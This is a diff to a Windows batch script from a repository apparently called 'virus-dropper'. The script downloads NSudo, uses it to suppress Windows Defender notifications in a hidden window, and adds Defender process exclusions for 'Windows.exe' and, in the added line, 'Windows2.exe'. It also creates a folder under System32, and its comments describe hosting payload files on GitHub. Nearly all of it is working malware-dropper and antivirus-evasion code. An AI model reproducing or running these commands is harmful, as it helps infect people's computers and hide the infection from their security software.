@@ -11,8 +11,7 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NS
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 ::windows defender exclusions
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
-::direct download link
-::edit this to your files
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
 md "%systemroot%\System32\Windowsexe"
 
 ::upload files here: github.com - create account and create repository (public) then upload files
